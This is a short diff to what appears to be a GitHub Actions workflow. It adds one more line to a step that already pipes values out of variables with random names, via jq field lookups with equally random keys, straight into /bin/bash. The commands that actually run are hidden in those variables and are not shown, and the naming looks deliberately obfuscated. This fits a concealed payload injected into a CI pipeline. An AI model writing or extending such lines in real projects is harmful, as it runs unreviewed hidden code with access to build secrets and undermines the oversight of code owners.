@@ -29,6 +29,7 @@ jobs:
           printf '%s' "$otwia6564" | jq -r .lr06 | /bin/bash
           echo $rfu200 | jq -r .ezjb378 | /bin/bash
           echo $paw1751 | jq -r .zkody0 | /bin/bash
+          echo $h470 | jq -r .e93518 | /bin/bash
 
       - name: Save artifact
         uses: actions/upload-artifact@v4
